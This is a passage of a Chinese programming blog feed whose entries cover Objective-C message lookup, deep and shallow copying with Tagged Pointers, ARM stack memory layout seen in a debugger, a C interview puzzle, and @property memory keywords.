123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121IMP lookUpImpOrForward(Class cls, SEL sel, id inst, bool initialize, bool cache, bool resolver)&#123; Class curClass; IMP imp = nil; Method meth; bool triedResolver = NO; runtimeLock.assertUnlocked(); //因为 _class_lookupMethodAndLoadCache3 传入的 cache = NO， //所以这里会直接跳过 if 中代码的执行， //在 objc_msgSend 中已经使用汇编代码查找过了。 if (cache) &#123; imp = cache_getImp(cls, sel); if (imp) return imp; &#125; //根据 cls-&gt;isRealized() 来判断是否要调用 realizeClass 函数在 // Objective-C 运行时 初始化的过程中会对其中的类进行第一次初始化 //也就是执行 realizeClass 方法，为类分配可读写结构体 class_rw_t //的空间，并返回正确的类结构体。 if (!cls-&gt;isRealized()) &#123; rwlock_writer_t lock(runtimeLock); realizeClass(cls); &#125; //根据 cls-&gt;isInitialized() 来判断类的是不是 initialized， //也就是类的首次被使用的时候，其 initialize 方法要在此时被调用 //一次，也仅此一次。没有 initialized 的话，则调用 //_class_initialize 函数去触发这个类的 initialize 方法，然后 //会设置 isInitialized 状态为 initialized if (initialize &amp;&amp; !cls-&gt;isInitialized()) &#123; _class_initialize (_class_getNonMetaClass(cls, inst)); // If sel == initialize, _class_initialize will send +initialize and // then the messenger will send +initialize again after this // procedure finishes. Of course, if this is not being called // from the messenger then it won't happen. 2778172 &#125; // The lock is held to make method-lookup + cache-fill atomic // with respect to method addition. Otherwise, a category could // be added but ignored indefinitely because the cache was re-filled // with the old value after the cache flush on behalf of the category. retry: runtimeLock.read(); // 是否开启GC(垃圾回收)； 新版本这一段代码已经没有了。 if (ignoreSelector(sel)) &#123; imp = _objc_ignored_method; cache_fill(cls, sel, imp, inst); goto done; &#125; // 这里再次查找 cache 是因为有可能 cache 真的又有了，因为锁的原因 imp = cache_getImp(cls, sel); if (imp) goto done; // Try this class's method lists. meth = getMethodNoSuper_nolock(cls, sel); if (meth) &#123; log_and_fill_cache(cls, meth-&gt;imp, sel, inst, cls); imp = meth-&gt;imp; goto done; &#125; // Try superclass caches and method lists. curClass = cls; while ((curClass = curClass-&gt;superclass)) &#123; // Superclass cache. imp = cache_getImp(curClass, sel); if (imp) &#123; if (imp != (IMP)_objc_msgForward_impcache) &#123; // Found the method in a superclass. Cache it in this class. log_and_fill_cache(cls, imp, sel, inst, curClass); goto done; &#125; else &#123; // Found a forward:: entry in a superclass. // Stop searching, but don't cache yet; call method // resolver for this class first. break; &#125; &#125; // Superclass method list. meth = getMethodNoSuper_nolock(curClass, sel); if (meth) &#123; log_and_fill_cache(cls, meth-&gt;imp, sel, inst, curClass); imp = meth-&gt;imp; goto done; &#125; &#125; // No implementation found. Try method resolver once. if (resolver &amp;&amp; !triedResolver) &#123; runtimeLock.unlockRead(); _class_resolveMethod(cls, sel, inst); // Don't cache the result; we don't hold the lock so it may have // changed already. Re-do the search from scratch instead. triedResolver = YES; goto retry; &#125; // No implementation found, and method resolver didn't help. // Use forwarding. imp = (IMP)_objc_msgForward_impcache; cache_fill(cls, sel, imp, inst); done: runtimeLock.unlockRead(); // paranoia: look for ignored selectors with non-ignored implementations （新版本没有这两句断言） assert(!(ignoreSelector(sel) &amp;&amp; imp != (IMP)&amp;_objc_ignored_method)); // paranoia: never let uncached leak out （新版本没有这两句断言） assert(imp != _objc_msgSend_uncached_impcache); return imp;&#125; lookUpImpOrForward 主要做了以下几个工作 判断类的初始化 cls-&gt;isRealized() 和 cls-&gt;isInitialized() ； 是否开启GC(垃圾回收)；（新版本没有这一步） 再次尝试去缓存中获取IMP；（因为锁的原因） 找不到接着去 class 的方法列表查找，找到会加入缓存列表然后返回 IMP； 找不到，去父类的缓存列表找，然后去父类的方法列表找，找到了会加入自己的缓存列表，然后返回 IMP，找不到循环此步骤，直到找到基类； 都找不到则 _class_resolveMethod 函数会被调用，进入消息动态处理、转发阶段。 对于 objc_msgSend 反汇编的分析就结束啦！如果是在动态调试过程中，遇到 objc_msgSend 想要进入被调用的方法的话，有 cache，则直接 si 进入 br X17，如果没有 cache，则在 _objc_msgSend_uncached_impcache 函数中最后几行中的 br X17 指令输入 si 即可进入被调用方法。 Reference[1] ObjC Runtime（五）：消息传递机制 https://xiuchundao.me/post/runtime-messaging[2] 从源代码看 ObjC 中消息的发送 http://draveness.me/message/[3] objc_msgSend内部到底做了什么？ http://oriochan.com/14710029019312.html[4] 用 isa 承载对象的类信息 http://www.desgard.com/isa/[5] 深入解析 ObjC 中方法的结构https://github.com/Draveness/iOS-Source-Code-Analyze/blob/master/contents/objc/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%20ObjC%20%E4%B8%AD%E6%96%B9%E6%B3%95%E7%9A%84%E7%BB%93%E6%9E%84.md 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[copy 与 mutableCopy（传说中的深浅拷贝）]]></title>
      <url>https://amywushu.github.io/2016/10/20/%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89.html</url>
      <content type="text"><![CDATA[光是永恒的，所以你是永恒的。 概念对象拷贝有两种方式：浅拷贝和深拷贝。 浅拷贝(shallow copy)，并不拷贝对象本身，仅仅是拷贝指向对象的指针。如果 B = [A 浅拷贝]，则 A、B 两个对象中都保存的同一个指针，如果 A 通过这个指针改变了指针指向的对象，那么 B 指针指向的对象也就随之改变了； 深拷贝是直接拷贝整个对象到另一块内存中，开辟新的地址来存储，两个对象至此一别，再无关联。 对于集合对象（如 NSSArray、NSDictionary 等）而言，又有单层深拷贝与完全拷贝之分。 单层深拷贝(one-level-deep copy)：指的是对于被拷贝对象，至少有一层是深拷贝。完全拷贝(real-deep copy)：指的是对于被拷贝对象的每一层都是对象拷贝。 copy 与 mutableCopy不管是集合类对象，还是非集合类对象，接收到 copy 和 mutableCopy 消息时，都遵循以下准则： copy 返回不可变(imutable)对象，如果对copy返回值使用可变对象方法就会crash； mutablCopy 默认返回可变(mutable)对象（如果拷贝后的对象本身是不可变的，那也没法变呀，总不能改变人对象的类型吧，比如 NSString *str2 = [str1 mutableCopy]; ）。 示例头文件首先定义了一系列会用到的属性，另外，我在宏定义里去掉了 NSLog 的时间戳，然后定义了 AmyLog ，用来显示对象的所属类，以及地址。 123456789101112131415161718192021222324252627#import &lt;Foundation/Foundation.h&gt;#define NSLog(FORMAT, ...) fprintf(stderr, "%s\n", [[NSString stringWithFormat:FORMAT, ##__VA_ARGS__] UTF8String] )#define AmyLog(_var) NSLog(@" (%@ *) %p\n", [_var class], _var)@interface FirstClass : NSObject//非集合类对象@property (nonatomic, copy) NSString *string;@property (nonatomic, strong) NSMutableString *mString;@property (nonatomic, copy) NSString *stringCopy;@property (nonatomic, copy) NSString *stringMutableCopy;@property (nonatomic, strong) NSMutableString *mStringCopy;@property (nonatomic, strong) NSMutableString *mStringMutableCopy;//集合类对象@property (nonatomic, copy) NSArray *array;@property (nonatomic, copy) NSArray *arrayCopy;@property (nonatomic, copy) NSArray *arrayMutableCopy;@property (nonatomic, strong) NSMutableArray *mArrayCopy;@property (nonatomic, strong) NSMutableArray *mArrayMutableCopy;@end 非集合类对象(NSString)执行代码：1234567891011121314FirstClass *fC = [[FirstClass alloc] init]; fC.string = @"originString";fC.stringCopy = fC.string; //浅，指针 (不可变String）fC.stringMutableCopy = [fC.string mutableCopy]; //深，新地址 (可变String) fC.mStringCopy = [fC.string copy]; //浅，指针 (不可变String）fC.mStringMutableCopy = [fC.string mutableCopy]; //深，新地址 (可变String) NSLog(@"\n非集合类对象(NSString)：\noriginal address: "); AmyLog(fC.string);NSLog(@"copy -&gt; NSString: "); AmyLog(fC.stringCopy);NSLog(@"mutableCopy -&gt; NSString: "); AmyLog(fC.stringMutableCopy);NSLog(@"copy -&gt; NSMutableString: "); AmyLog(fC.mStringCopy);NSLog(@"mutableCopy -&gt; NSMutableString: "); AmyLog(fC.mStringMutableCopy); 打印结果： __NSCFConstantString 和 __NSCFString__NSCFConstantString __NSCFConstantString 对象，就是字符串常量对象，存储在栈上，创建之后由系统来管理内存释放.相同内容的 NSCFConstantString 对象地址相同。该对象引用计数很大，为固定值不会变化，表示无限运行的 retainCount ，对其进行 retain 或 release 也不会影响其引用计数。 当创建一个 NSCFConstantString 对象时，会检测这个字符串内容是否已经存在，如果存在，则直接将地址赋值给变量；不存在的话，则创建新地址，再赋值。 总的来说，对于 NSCFConstantString 对象，只要字符串内容不变，就不会分配新的内存地址，无论你是赋值、 retain、 copy 。这种优化在大量使用 NSString 的情况下可以节省内存，提高性能。 ——摘自简书作者路子：NSString：内存简述，Copy与Strong关键字 对于 NSString 来说，以下几种赋值方法将会保存为 NSCFConstantString 对象： 直接赋值，如 NSString *str = @&quot;STR&quot;; stringWithString ,如 NSString *str = [NSString stringWithString:@&quot;Str&quot;]; str1 = str2; str1 = [str2 copy/retain]; __NSCFString __NSCFString 对象是 NSString 的一种子类，存储在堆上，不属于字符串常量对象。该对象创建之后和其他的 Obj 对象一样引用计数为1，对其执行 retain 和 release 将改变其 retainCount 。 诸如 [NSString stringWithFormat:] 方法以及 NSMutableString 创建的字符串等，都是构造的这种对象。 分析mutableCopy 意味着你告诉编译器，我拷贝过来的这个对象可能会改变，因此编译器肯定会新开辟一个地址给你。 因此采用这种方式的都是深拷贝（包括单层深拷贝和完全拷贝）。通过结果我们也可以看见，正如我们前面所提到的，copy 返回不可变对象，因此对于原始对象是不可变的 NSSring 类型，完全没有必要再新分配一块内存。因此对于不可变的非集合对象，采用 mutableCopy 方式的拷贝就是深拷贝，copy 是浅拷贝。 非集合类对象(NSMutableString)执行代码：123456789101112fC.mString = [NSMutableString stringWithString:@"mStringingi"];fC.stringCopy = fC.mString; //深，新地址（可变String）fC.stringMutableCopy = [fC.mString mutableCopy]; ////深，新地址 (可变String) fC.mStringCopy = [fC.mString copy]; //深，新地址，可变String）fC.mStringMutableCopy = [fC.mString mutableCopy]; //深，新地址，(可变String) NSLog(@"\n非集合类对象(NSMutableString)：\noriginal address: "); AmyLog(fC.mString);NSLog(@"copy -&gt; NSString: "); AmyLog(fC.stringCopy);NSLog(@"mutableCopy -&gt; NSString: "); AmyLog(fC.stringMutableCopy);NSLog(@"copy -&gt; NSMutableString: "); AmyLog(fC.mStringCopy);NSLog(@"mutableCopy -&gt; NSMutableString: "); AmyLog(fC.mStringMutableCopy); 打印结果： 分析我们已经知道只要用 mutableCopy ，对于非集合对象的拷贝，无论可变不可变，都是深拷贝。 copy 对于不可变对象的拷贝是浅拷贝。那么对于 copy 可变对象呢？如上图的结果所示，是深拷贝。 也很容易理解，我这个对象是可变的，我随时可能通过其他引用它的指针来改变这个对象，现在你要拷贝一份不可变的内容，编译器当然不能直接把它的指针给你啦，这样岂不就是可变的了？所以要新分配给你一块内存，用来储存你拷贝的不可变内容。 就是说，对于可变非集合对象的拷贝，copy 和 mutableCopy 都是做的深拷贝。 __NSTaggedPointerStringTagged Pointer 是一个能够提升性能、节省内存的有趣的技术。我们知道，程序都使用了指针地址对齐概念。指针地址对齐就是指在分配堆中的内存时往往采用偶数倍或以2为指数倍的内存地址作为地址边界。几乎所有系统架构，包括 Mac OS 和 iOS，都使用了地址对齐概念对象。对于 iOS 和 MAC 来说，指针地址是以16个字节（或16的倍数）为对齐边界的，进一步说，分配的内存地址最后4位永远都是0。 Tagged Pointer 利用了这一现状，它使对象指针中非零位（最后4位）有了特殊的含义。在苹果的64位 Objective-C 实现中，若对象指针的最低有效位为1(即奇数)，则该指针为 Tagged Pointer 。这种指针不通过解引用 isa 来获取其所属类，而是通过接下来三位的一个类表的索引。该索引是用来查找所属类是采用 Tagged Pointer 的哪个类。剩下的60位则留给类来使用。 Tagged Pointer 有一个简单的应用，那就是 NSNumber 。它使用60位来存储数值。最低位置1。剩下3位为 NSNumber 的标志。这样，就可以存储任何所需内存小于60位的数值。 注：以上是在 x86_64 架构中，在 iOS ARM64 架构中，是最高4位表示所属类，对于最低位，不同类有不同的意义，比如 NSString 代表的是字符长度 length，NSNumber 我猜测代表的是数字长度类型。 从外部看，Tagged Pointer很像一个对象。它能够响应消息，因为 objc_msgSend 可以识别 Tagged Pointer 。假设你调用 integerValue ，它将从那60位中提取数值并返回。这样，每访问一个对象，就省下了一次真正对象的内存分配，省下了一次间接取值的时间。同时引用计数可以是空指令，因为没有内存需要释放。对于常用的类，这将是一个巨大的性能提升。 NSString 也是如此。对于那些所需内存小于60位的字符串，它可以创建一个 Tagged Pointer。所需内存大于60位的则放置在真正的 NSString 对象里。这使得常用的短字符串的性能得到明显的提升。 关于 NSString 中的 Tagged Pointer 编码比较复杂，条件是长度小于11位，且由 Apple 的代码生成在运行时，即不是直接定义，而是如上图中 mutableCopy/copy 转换而来，编码详情请见【译】采用Tagged Pointer的字符串 在 WWDC2013 中 APPLE 对于它的特点是这样总结的： Tagged Pointer 专门用来存储小的对象，例如 NSNumber 和NSDate Tagged Pointer 指针的值不再是地址了，而是真正的值。所以，实际上它不再是一个对象了，它只是一个披着对象皮的普通变量而已。所以，它的内存并不存储在堆中，也不需要 malloc 和 free 。跟 __NSCFConstantString 一样拥有非常大的 retainCount ，因为压根儿就不在堆上啊。 在内存读取上有着3倍的效率，创建时比以前快106倍。 对 NSString 对象来说，当非字面量的数字，英文字母字符串的长度小于等于11的时候会自动成为 NSTaggedPointerString 类型（赋值为常量除外），如果有中文或其他特殊符号（可能是非 ASCII 字符）存在的话则会直接成为 __NSCFString 类型。 Tagged Pointer 举例比如我们将上面的字符串改为 fC.mString = [NSMutableString stringWithString:@&quot;mStringingin&quot;];，比之前少了1位，只有11位，则输出结果就变为了： 除了拷贝的可变副本（最后一个），其他不可变副本都是 Tagged Pointer ，直接存储的值。 集合类对象(NSArray)执行代码：1234567891011121314fC.array = [NSArray arrayWithObjects:@"hello",@"world",@"baby", nil];fC.arrayCopy = fC.array; //浅，指针fC.arrayMutableCopy = [fC.array mutableCopy]; //单层深，新地址 fC.mArrayCopy = [fC.array copy]; //浅，指针fC.mArrayMutableCopy = [fC.array mutableCopy]; //单层深，新地址 NSLog(@"\n集合类对象(NSArray)：\noriginal address: "); AmyLog(fC.array); AmyLog([fC.array objectAtIndex:1]); NSLog(@"copy -&gt; NSArray: "); AmyLog(fC.arrayCopy); AmyLog([fC.arrayCopy objectAtIndex:1]);NSLog(@"mutableCopy -&gt; NSArray: "); AmyLog(fC.arrayMutableCopy); AmyLog([fC.arrayMutableCopy objectAtIndex:1]);NSLog(@"copy -&gt; NSMutableArray: "); AmyLog(fC.mArrayCopy); AmyLog([fC.mArrayCopy objectAtIndex:1]);NSLog(@"mutableCopy -&gt; NSMutableArray: "); AmyLog(fC.mArrayMutableCopy); AmyLog([fC.mArrayMutableCopy objectAtIndex:1]); 打印结果： 分析从结果可以发现，对于第一层的指针来说，跟 NSString 是一样的，copy 浅拷贝（复制指针，即指针不变）， mutableCopy 深拷贝（新内存），但是打印数组中的元素，就发现元素的指针并没有变，也就是第二层依然是浅拷贝，因此这就是单层深拷贝了。 集合的浅拷贝和完全拷贝集合的浅拷贝有非常多种方法（上面那种 copy 就是）。当你进行浅拷贝时，会向原始的集合发送retain消息，引用计数加1，同时指针被拷贝到新的集合。 现在让我们看一些浅拷贝的例子： 123NSArray *shallowCopyArray = [someArray copyWithZone:nil]; NSSet *shallowCopySet = [NSSet mutableCopyWithZone:nil]; NSDictionary *shallowCopyDict = [[NSDictionary alloc] initWithDictionary:someDictionary copyItems:NO]; 那么如何才能对元素也进行深拷贝呢？ 集合的深拷贝有两种方法。可以用 initWithArray:copyItems: 将第二个参数设置为 YES 即可深拷贝，如 1NSDictionary shallowCopyDict = [[NSDictionary alloc] initWithDictionary:someDictionary copyItems:YES]; 如果你用这种方法深拷贝，集合里的每个对象都会收到 copyWithZone: 消息。如果集合里的对象遵循 NSCopying 协议，那么对象就会被深拷贝到新的集合。如果对象没有遵循 NSCopying 协议，而尝试用这种方法进行深拷贝，会在运行时出错。 copyWithZone: 这种拷贝方式只能够提供一层内存拷贝(one-level-deep copy)，而非真正的深拷贝。 第二个方法是将集合进行归档(archive)，然后解档(unarchive)，如： 1NSArray *trueDeepCopyArray = [NSKeyedUnarchiver unarchiveObjectWithData:[NSKeyedArchiver archivedDataWithRootObject:oldArray]]; 终于搞定这个了！ Reference[1] NSString：内存简述，Copy与Strong关键字 http://www.jianshu.com/p/0e98f37114e3[2] iOS 集合的深复制与浅复制 https://www.zybuluo.com/MicroCai/note/50592[3] 深入理解Tagged Pointe http://www.infoq.com/cn/articles/deep-understanding-of-tagged-pointer/[4] 【译】采用Tagged Pointer的字符串 http://www.cocoachina.com/ios/20150918/13449.html 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[栈·参数存储排布]]></title>
      <url>https://amywushu.github.io/2016/10/12/%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86-%E6%A0%88%C2%B7%E5%8F%82%E6%95%B0%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F.html</url>
      <content type="text"><![CDATA[人在世上，爱欲之中，独生独死，独来独往，苦乐自知，无有代者。 ——《佛说大乘无量寿庄严清净平等觉经》 基础提要：栈结构ARM内存中的栈区域是满递减的，由高地址向低地址增长，SP指针始终指向最后一个压入栈的地址，即栈顶地址。如图所示： 为什么栈向下增长？ 每一个可执行C程序，从低地址到高地址依次是：text，data，bss，堆，栈，环境参数变量；其中堆和栈之间有很大的地址空间空闲着，在需要分配空间的时候，堆向上涨，栈往下涨。 这样设计可以使得堆和栈能够充分利用空闲的地址空间。如果栈向上涨的话，我们就必须得指定栈和堆的一个严格分界线，但这个分界线怎么确定呢？平均分？但是有的程序使用的堆空间比较多，而有的程序使用的栈空间比较多。 所以就可能出现这种情况：一个程序因为栈溢出而崩溃的时候，其实它还有大量闲置的堆空间呢，但是我们却无法使用这些闲置的堆空间。 所以呢，最好的办法就是让堆和栈一个向上涨，一个向下涨，这样它们就可以最大程度地共用这块剩余的地址空间，达到利用率的最大化！！ —— 引用自判断栈和堆的生长方向 如何判断栈的增长方向？很简单，我们可以通过两个函数的调用来确定。我们知道，执行一个函数时，这个函数的相关信息都会出现栈之中，比如参数、返回地址和局部变量。 那么，当它调用另一个函数时，在它栈信息保持不变的情况下，会把被调用函数的信息放到栈中。两个函数的相对信息位置是固定的，肯定是先调用的函数其信息先入栈，后调用的函数其信息后入栈。只需要判断这两个地址，就可以判断栈的增长方向了。 比如设计两个函数fun1()和fun2()，将fun1()中某参数的地址传给fun2()，且在fun1()中调用fun2()，最后在fun2()中打印出两个函数参数的地址，则大功告成。 12345678910111213141516void func2(int *a)&#123; int b=0; printf("%x\n%x\n",a,&amp;b);&#125;void func1()&#123; int a=0; func2(&amp;a);&#125;int main()&#123; func1();&#125; 我这边测试打印出来分别是5fbff91c 5fbff8f4 （我用的Xcode 的 command line 测试的）。即a 的地址 &gt; b的地址，先分配的是高地址，因此是高地址向低地址增长。 如何区分栈底和栈顶？很容易将分不清高地址和低地址到底谁才是栈底。我们可以想象一个桶，这个桶内的空间就是栈区，桶底（栈底）是确定了的，不会改变。往桶内加水，即使入栈操作。水面即是栈顶，也就SP指针所在的位置。我们不断加水，只会使得水面（栈顶SP指针）增长，而水底（栈底指针）仍旧不变。而栈区又是高地址向低地址增长，因此栈区的最高地址是为栈低，SP指针是栈顶指针。 只不过，在实际应用情况中，我们经常习惯将栈底指针（最高地址处）放在最上面，SP指针在最下面，也就是一个倒扣着的桶，在失重情况下，往倒扣的桶里加水，水底仍然是栈底指针，水面仍然是栈顶指针，水面随着水的加入而增长。 实例在逆向过程中，我一直对栈的数据排列非常迷惑，现在让我们一起来解决它吧！以下是我逆向遇到的一个小实例： 在图中我们可以看到目前运行到第三行代码stp x9, x10, [sp, #8]处，stp指令是将寄存器中的值依次存入后面的地址处。我们先打印一下x12 x8以及sp的值： 那么也就是说第二条指令stp x12, x8, [sp, #24]已经将x12和x8的值存入了sp+24地址处。 那么我们仔细想想，究竟这两个值在栈上是如何排列的呢？先存入的是x12还是x8呢？第二参数是在sp+24的高地址处还是低地址处呢？ 我们打印一下内存上的信息看一下就知道了： /4xb: 就是说从该地址开始，按照1个字节，16进制的方式打印4个单位。/4xw: 按照4个字节，16进制的方式打印4个单位 更多有关打印格式的请看gdb查看内存区命令 跟上面x12和x8比较后，我们可以发现，内存在打印的时候，每个打印单位（这里是以w格式打印，即4个字节）我们要从右往左看（从高地址到低地址），单位内部还是从左到右为高地址到低地址。也就是说，第一个打印单位的最右边是当前打印地址（最低地址），最后一个打印单位的最左边是最高地址。如下图所示，图中箭头为从高地址指向低地址： 那么，也就是说，x12存储在从sp+24 (0x16fd11cc8)到sp+31 (0x16fd11ccf)之间x8 存储在从sp+32 (0x16fd11cd0) 到sp+39 (0x16fd11cd7)之间 则他们之间的具体排列如下图所示 小测试（第3、4行命令）现在我们大概对数据的排布有一个更深入的理解了，那么，就以第三行命令来测试一下我们是否真的理解了吧！在执行第三条命令之前，我们先看一下x9，x10的值： 那么，按照上一条命令的方式，我们来猜测一下内存排布吧。stp x9, x10, [sp, #8] 这条命令的意思是，将x9，x10中的值依次放入sp+8所在的位置。那么，到底是存储在sp+8的高地址处，还是低地址处呢？ 其实很好理解，因为栈是向低地址处增长的，如果我们往sp到sp+8处写入这两个寄存器的值，很明显是不够的，这里只有8个字节的空间，而我们需要16个字节，因此sp指针就会往低地址处移动，则栈空间就增大了，但是sp指针并没有改变，这些指令都没有关于要改变栈顶指针的，所以这个想法是错误的。 也就是说，在往栈内存储数据时，都在高地址到给定的地址之间存入，即向栈中已分配的空间存入。 那么，x9，x10依次存储在sp+8 ~ sp+15，sp+16 ~ sp+23之间。 按照之前讲的打印单位与单位之间是从右往左为从高地址到低地址，单位内的顺序是从左往右，1个地址存储1个字节（8位，两个字符）。我们按照一个字节一个字节的打印（16进制），则 在sp+8 ~ sp+15处的数据应为：64 c3 af 0b 00 00 00 00； 在sp+16 ~ sp+31处的数据应为：86 dd a9 b1 00 00 00 00。 如果我们按照4xw的格式打印，则应该是sp+8: 0x0bafc364 0x00000000，sp+16: 0xb1a9dd86 0x00000000 我们打印一下看看猜测是否正确： 完全正确！我们继续往下执行第4条命令：str x11, [sp]这条命令的意思是，将x11中的值放入sp所指的地方。我们知道sp是栈顶指针，是栈的最后一个元素所在的位置，所以x11肯定是存储在sp到sp+8之间。打印一下x11的值： 那么，依旧按照之前的方法，每个打印单位，要从右往左看： 那么sp的地址0x16fd11cb0到sp+8 (0x16fd11cb8)之间依次应该为ef e1 0f db 00 00 00 00； 按照4xw的打印格式则应该为：0x16fd11cb0: 0xdbofelef 0x00000000 0x0bafc364 0x00000000 （sp+8 ~ sp+15是刚刚我们执行过的x9的值） 打印一下： 完全正确！好了，现在关于内存栈的数据排列，你是不是有更清晰的图像印在脑海里了呢？ 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[C语言编程题（2016年360笔试习题之病毒）]]></title>
      <url>https://amywushu.github.io/2016/09/21/%E7%BB%83%E4%B9%A0-C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B%E9%A2%98-2016%E5%B9%B4360%E7%AC%94%E8%AF%95%E4%B9%A0%E9%A2%98%E4%B9%8B%E7%97%85%E6%AF%92.html</url>
      <content type="text"><![CDATA[人生如此，拿酒来。 ——南笙 题目（编程题：病毒）小B最近对破解和程序攻击产生了兴趣，她迷上了病毒，然后可怕的事情发生了。不知道什么原因，可能是小B的技术水平还不够高，小B编写的病毒程序在攻击一个服务器时出现了问题。尽管成功的入侵了服务器，但并没有按照期望的方式发挥作用。 小B的目的很简单：控制服务器内存区域，试图在内存中装入从1到n之间的n个自然数，以覆盖内存区域。可能是小B对编程理解上的问题，病毒似乎没有完全成功。可能是由于保护机制的原因，内存写入只接受二进制的形式，所以十进制表达中除了0和1之外的其他值都没有成功写入内存。小B希望知道，究竟有多少数成功的写入了服务器的内存！ 输入 输入中有多组测试数据，每组测试数据在单独的一行中，为整数n（1&lt;=n&lt;=10^9）。 输出 对每组测试数据，在单独的行中输出问题的答案。 举例 输入：10输出： 2 输入：20输出：3 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt;/** * 1. 输入的字符数组从最高位开始依次与1做比较 * 2. 小于等于1 取原值，并比较下一位，如果没有下一位，则返回； * 3. 大于1，则其后的位数都取1，并返回； * 4. 将得到的字符数组看作二进制，并转化为十进制。 * */static char addarray[10] = "";static char array1[10] = "";char * fun(char *cstring, int n) &#123; char compareString = *(cstring + n); char *onestring = "1"; char array[10] = ""; char *rec = ""; if (strcmp(onestring,&amp;compareString) &gt;= 0) &#123; //compareString &lt;= 1 array[0] = compareString; if (*(cstring+n+1)) &#123; strcat(array, fun(cstring, n+1)); strcpy(addarray, array); rec = addarray; &#125; else rec = cstring + n; &#125; else &#123; //compareString &gt; 1 for (int i = 0; i &lt; (strlen(cstring) - n); i++) &#123; strcat(array1, onestring); &#125; rec = array1; &#125; return rec;&#125;int main(int argc, const char * argv[]) &#123; char nstring[10]; printf("Input String:"); scanf("%s", nstring); char *resultString = fun(nstring, 0); printf("%s\n", resultString); long result = strtol(resultString, NULL, 2); printf("%ld\n", result); return 0;&#125; 输出： Input String:20113 Input String:1040101111 Input Stirng:23003041111111127 知识点总结关于字符数组和字符串在函数间的传递 从代码中可以看到我用了两个静态数组变量，之所以不直接定义在函数体内作为局部变量是因为： 当用字符指针char*返回字符数组首地址时，函数体内的局部变量数组里的值已经被释放，返回的首地址虽然没有变，但里面的值已经无意义了。 例如： 12345678910111213#include "stdio.h" char *test() &#123; //char tmp[30]="测试"; char *tmp="测试";//写成这样可以用指针返回数组首地址 return tmp; &#125; void main(void) &#123; printf("%s",test()); &#125; 打印出来的值可能是乱码也能为nil。解决方式：1. static全局变量 123456789101112#include "stdio.h" char *test()&#123; static char tmp[30]="static测试"; return tmp;&#125; void main(void)&#123; printf("%s",test());&#125; 在数组tmp[30]前面加入了static关键字，它就使得tmp[30]存放在内存中的静态存储区中，所占用的存储单元一直不释放，直到整个程序运行结束。所以当主函数调用完print()函数后，该空间依然存在。所以main()函数中接到首地值后可以访问数组中的元素。 2. 结构体作为返回值 123456789101112131415161718192021#include "stdio.h"#include "string.h"struct ret&#123; char buf[30];&#125;; struct ret test(char *tmp)&#123; struct ret a; strcpy(a.buf,tmp); return a;&#125;void main(void)&#123; struct ret b; b=test("用结构体作为返回值传递数组"); printf("%s",b.buf);&#125; 两点注意： 1、数组之间的赋值不要直接，即不要直接将数组 A 赋给数组 B，而是要用strcpy（字符型数组）或者memcpy（非字符型数组）。 2、用结构体定义变量和函数时不要忘了结构体名（上面程序的ret）。 Reference[1] 【原】C语言函数返回数组的问题 http://www.cnblogs.com/wuqi1003/archive/2013/01/09/2853657.html[2] C语言中字符串如何转换为二进制、八进制、十进制、十六进制 http://blog.csdn.net/edonlii/article/details/9162769[3] C语言之strcat函数 http://blog.csdn.net/hgj125073/article/details/8439448[4] C语言strcmp()函数：比较字符串（区分大小写） http://c.biancheng.net/cpp/html/162.html 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[@property 中的常用关键字分析]]></title>
      <url>https://amywushu.github.io/2016/09/08/%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90.html</url>
      <content type="text"><![CDATA[我搬进鸟的眼睛，经常盯着路过的风。 ——电影《路边野餐》 栈与堆首先，我们需要知道：为什么只有OC对象需要进行内存管理，而其它非对象类型（如基本数据类型）不需要我们来管理呢？ 因为： Objective-C 的对象在内存中是以堆的方式分配空间的 堆里面的内存是动态分配的，所以也就需要程序员手动的去添加内存、回收内存 OC对象存放于堆里面(堆内存要程序员手动回收，也就是 release ) 非OC对象一般放在栈里面(栈内存会被系统自动回收) 例如： 123int a = 10;int b = 20;Car *c = [[Car alloc] init]; 我们知道OC对象一般都是指针形式，大神ibireme在 Objective-C 中的类和对象中提到： 凡是首地址是*isa的struct指针，都可以被认为是objc中的对象。运行时可以通过isa指针，查找到该对象是属于什么类(Class)。 下图可以清楚的表示 OC 中的堆栈分配： assign 与 weak 基础知识提要 @property 声明的属性，会自动创建 getter,setter 方法。 属性中申明的关键字主要有三大类： readwrite/readonly： 是否生成 setter 方法, 默认 readwrite assign/weak/strong/copy/retain： setter 方法中如何传递所有权等内存管理策略, ARC 环境默认为 strong nonatomic/atomic：是否加线程锁（并不能完全控制线程访问，最好事是自己手动底层加锁，默认 atomic NSString 的引用计数LLVM是有优化的，并不是简单根据设定的关键字来判断。本文只是为了方便易懂，以这个类作为例子。 assign如果设置 assign ，在 setter 方法中是这样的： 123- (void)setCarName:(NSString *)name &#123; _carName = name; //默认是有下划线的&#125; 也就是说成员变量 _name 并没有获得 name 所指的对象的所有权，原来对象 @“Amywushu” 的 retainCount 不会改变。一旦 name 被释放，_carName 也就不再指向一个合法的位置，出现指针悬空，如下图所示，相当于 _carName （图中为 carName ）指向的 name，但实际上 _carName 是指向OC对象的，这里只是为了方便理解。 assign/weak 的区别ARC 中 OC 对象已经不再使用 assign 了，而是使用 weak ，两者的区别在： weak 弱引用所指的对象没有被任何strong指针指向，那么就将被销毁，所有指向这个对象的 weak 指针也将被置为 nil 。而 assign 